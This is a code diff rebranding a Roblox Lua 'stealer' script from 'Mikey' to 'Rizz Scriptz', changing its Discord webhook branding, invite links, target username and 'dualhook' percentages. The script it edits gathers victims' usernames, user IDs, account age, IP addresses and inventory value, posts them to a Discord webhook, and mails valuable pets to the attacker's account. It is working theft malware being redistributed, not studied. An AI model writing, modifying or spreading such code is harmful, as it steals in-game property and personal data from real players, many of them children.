@@ -8,7 +8,7 @@
 ]]--
 
 getgenv().Settings = {
-    User = "unstoppable_rookie",
+    User = "Unstoppable_rookie",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Easy Dubs",
     Titanics = {
@@ -21,7 +21,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     Pogs = {
         Dualhook = true,
@@ -955,14 +955,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://media.discordapp.net/attachments/1108927671880126545/1127900444551823360/mike_bruh.png?width=625&height=625"
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Mikey",
+            ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Mikey||",
-                ["url"] = "https://discord.gg/yJbPuyrZ6k",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Mikeys Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1025,14 +1025,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://media.discordapp.net/attachments/1108927671880126545/1127900444551823360/mike_bruh.png?width=625&height=625"
+        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
             ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Mikey||",
-                ["url"] = "https://discord.gg/yJbPuyrZ6k",
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1041,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Mikeys Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1118,7 +1118,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Mikey On Top"
+local mailmsg = ".gg/uSgzNwHDTS"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
